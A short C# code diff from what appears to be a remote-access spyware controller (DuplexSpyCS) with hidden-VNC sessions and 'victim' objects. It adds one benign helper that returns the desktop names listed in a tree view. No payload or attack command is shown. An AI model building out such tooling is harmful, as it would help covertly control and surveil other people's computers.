@@ -52,6 +52,8 @@ namespace DuplexSpyCS
             return new stHvncSession();
         }
 
+        public List<string> fnGetDesktops() => treeView1.Nodes.Cast<TreeNode>().Select(x => x.Text).ToList();
+
         void fnRecv(clsListener ltn, clsVictim victim, List<string> lsMsg)
         {
             if (!clsTools.fnbVictimEquals(victim, m_victim))
